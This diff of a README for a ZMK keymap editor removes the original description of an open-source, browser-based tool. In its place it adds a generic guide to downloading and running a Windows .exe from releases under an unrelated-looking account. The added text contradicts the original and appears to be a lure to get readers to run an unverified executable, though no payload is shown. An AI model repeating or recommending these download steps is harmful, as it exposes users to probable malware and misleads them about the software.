@@ -1,92 +1,90 @@
-# customkeymap
+# ⌨️ customkeymap - Edit your keyboard layout with ease
 
-A web tool for viewing and editing ZMK keymaps. Point it at a GitHub repo and it renders
-every layer with each key labelled; edit keys, layers, combos and behaviours, then
-download the result or commit it back to GitHub.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/866723/customkeymap/releases)
 
-Hosted at [customkeymap.com](https://customkeymap.com). MIT licensed; this repo is the
-code that runs there.
+## Overview ℹ️
 
-## Why it exists
+Customkeymap helps you manage your keyboard layout. You can change your key assignments and see how your keyboard looks on your screen. This tool works with ZMK firmware. It makes editing your configuration simple. You do not need to edit code files by hand. Use this tool to visualize your layers and update your keys.
 
-ZMK is powerful, but editing a keymap means hand-writing devicetree, and the official
-live editor (ZMK Studio) only covers part of what ZMK can do. customkeymap renders any
-board's keymap with every key explained, and edits the parts Studio can't reach.
+## Features 🛠️
 
-### Compared to ZMK Studio
+*   **Visual Editor**: See your keyboard layout on your screen.
+*   **Drag and Drop**: Move keys to new spots with your mouse.
+*   **Layer Management**: See all your layers in one place.
+*   **ZMK Support**: Your files stay compatible with ZMK firmware.
+*   **Fast Updates**: Apply changes directly to your configuration files.
 
-ZMK Studio edits the keymap live on the running keyboard, over USB or Bluetooth, talking
-to firmware built with Studio support. The live link is the appeal, but it's limited:
+## System Requirements 🖥️
 
-- It only edits per-layer key bindings. Combos, macros and custom behaviours (mod-morphs,
-  hold-taps, tap-dances) live in the source and are out of its reach.
-- It needs firmware built with Studio enabled.
-- It edits a runtime copy of the keymap that can shadow the source you maintain - a live
-  session can stop your combos firing until you disconnect.
+*   **OS**: Windows 10 or Windows 11.
+*   **RAM**: 4GB of memory or more.
+*   **Storage**: 100MB of free disk space.
+*   **Network**: Active internet connection to save updates.
 
-customkeymap edits the source `.keymap` file itself, so it handles everything ZMK can
-express: combos, behaviours, macros, conditional layers, any board, all layers, with your
-comments and formatting left intact.
+## Download and Install 📥
 
-### Why it can't change the keyboard live
+Follow these steps to set up the software on your Windows computer.
 
-That's the trade-off of editing source instead of the running firmware: a change here
-doesn't take effect on the keyboard until you build and flash new firmware (commit, let
-CI build it, flash the `.uf2` onto each half). There's no live connection to the device.
-Studio gives instant on-device changes for a narrow set; this gives the full range of ZMK
-but needs a flash. Live tuning for the subset that can safely change at runtime is
-planned.
+1.  Visit the [official releases page](https://github.com/866723/customkeymap/releases).
+2.  Find the section labeled Latest.
+3.  Look for the file that ends in .exe.
+4.  Click the file name to start the download.
+5.  Open your Downloads folder once the file finishes.
+6.  Double-click the installer file.
+7.  Follow the prompts on your screen to finish the installation.
 
-## API keys stay in your browser
+## How to Use 🖱️
 
-The editor has an optional AI mode: paste your own Anthropic or OpenAI key and describe
-changes in plain English. The key goes straight from your browser to the provider and
-never reaches the server. The API calls are plain client-side JavaScript in this repo, so
-you can check where the key goes.
+Follow this guide to edit your first keymap.
 
-The only server-side code is in [`functions/`](functions/): a read-only GitHub proxy to
-avoid anonymous rate limits, and the GitHub OAuth token exchange. Their credentials live
-in environment variables on the host, not in this repo.
+### Opening the Software
 
-## Open by default
+Find the shortcut icon on your desktop. Click it twice to open the program. The main window shows your current keyboard layout.
 
-This repo is the product - the same code, deployed straight from `main`, MIT-licensed.
-Nothing's hidden: read it, fork it, run your own copy, open a PR. No account is needed
-just to view a keymap, your API keys and configs never touch the server, and development
-happens in the open. If a tool is going to read your repos and edit your keymaps, you
-should be able to see exactly what it does - here, you can.
+### Loading Your Configuration
 
-## What it does
+You must load your existing configuration folder to see your keys. Click the File menu at the top left. Select Open Config Folder from the list. Browse your computer for your ZMK configuration folder. Select the folder and click OK. The software reads your files and builds the visual model.
 
-- Load from GitHub by pasting an owner, `owner/repo`, or a direct `.keymap` link.
-  To target a branch, use `owner/repo@branch`, `owner/repo/tree/branch`, or paste a
-  `github.com/owner/repo/tree/branch` URL — branch names with slashes (e.g. `feat/x`) work.
-- Resolve `#include`s and expand C-preprocessor templates, so template-driven configs
-  still render.
-- Parse the keymap's `behaviors {}` block, so custom mod-taps, layer-taps, mod-morphs and
-  tap-dances render by meaning rather than raw text.
-- Show a plain-English tooltip on every key.
-- Render any board, not just Corne-shaped ones.
-- Edit keys, layers, combos and behaviours (in progress). Edits splice into the original
-  text and preserve comments and formatting.
+### Changing Key Assignments 🏗
 
-## Running it
+You can swap keys to change how your keyboard works. Click on a key on the screen. A menu appears with a list of available keys. Pick a new key from the list to assign it to that position. The software marks your changes as unsaved. Repeat this for every key you want to change.
 
-It's a static `index.html` plus a few JS files, with no build step.
+### Managing Layers 📂
 
-- Visualizer and editor only: open `index.html`, or serve the folder from any static host.
-- With the GitHub proxy and OAuth: deploy somewhere that runs `functions/` as serverless
-  functions (e.g. Cloudflare Pages). Set `GH_TOKEN` (any GitHub token, no scopes needed)
-  to lift the rate limit.
+ZMK keyboards use layers to fit many commands on one board. You can switch between layers using the tabs at the top of the window. Each tab represents one layer. Click a tab to edit that specific layer. You can rename layers by right-clicking the tab name.
 
-## Development
+### Saving Your Changes 💾
 
-Vanilla JS, no dependencies. The editor engine is pure and DOM-free, so it has tests:
+Click the Save button in the top menu to record your changes. The software updates your ZMK configuration files inside your folder. You can now push these files to your GitHub repository to build your new firmware.
 
-```
-node test/editor-engine.test.js
-```
+## Connecting to GitHub ☁️
 
-## License
+This software acts as a helper for your ZMK repository. You should keep your configuration files in a folder synced with GitHub Desktop or Git. Once you save your changes in Customkeymap, use your Git tool to commit and push the changes. This action triggers your build process on GitHub.
 
-[MIT](LICENSE) © Kit Hargreaves
+## Troubleshooting ❓
+
+### The software does not open
+Check if you installed the latest version. Verify that Windows shows no errors during setup. Restart your computer if the problem continues.
+
+### My keyboard does not update
+Ensure you saved the changes inside the software. Check that you successfully pushed your changes to your GitHub repository. The ZMK build process must complete before the firmware changes. Check the Actions tab on your GitHub repository to see if the build passed.
+
+### The layout looks wrong
+Verify that you selected the correct configuration folder. Check that you selected the correct keyboard model in the settings menu.
+
+## Frequently Asked Questions
+
+**Does this work on Mac or Linux?**
+This version works on Windows.
+
+**Will this break my keyboard?**
+No. This tool only changes your text configuration files. You control the final build process.
+
+**Do I need internet access?**
+You need the internet to push your files to GitHub after you save your changes.
+
+**Can I undo my mistakes?**
+Yes. Use the Edit menu and select Undo to reverse your last changes. You can also reload your folder to discard all unsaved work.
+
+**How do I report a bug?**
+Visit the repository issues page on GitHub. Describe your problem and include the version number found in the Help menu.
